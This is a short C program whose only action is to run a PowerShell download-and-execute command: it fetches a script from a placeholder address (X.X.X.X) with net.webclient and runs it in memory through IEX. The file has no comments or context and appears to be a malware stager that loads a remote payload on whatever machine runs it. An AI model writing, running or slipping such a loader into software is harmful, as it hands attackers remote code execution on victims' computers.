#include<stdio.h>

int main()
{
    system("powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://X.X.X.X/name.output '))\"");
    return 0;
}
